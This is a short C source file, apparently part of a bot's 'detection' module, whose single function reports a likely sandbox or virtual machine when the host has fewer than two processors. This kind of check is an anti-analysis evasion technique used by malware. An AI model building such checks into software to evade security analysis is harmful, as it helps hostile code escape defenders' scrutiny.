#include "../../includes/detection/cpu.h"


/*
    *    util/bot/util/detection/cpu.c
    *    Date: 12/11/21
    *    Author: 0x80000000
*/


bool c_cpu(void) {
    struct sysinfo s_info;
    if (sysconf(_SC_NPROCESSORS_CONF) < 2) {
        return true;
    }
    return false;
}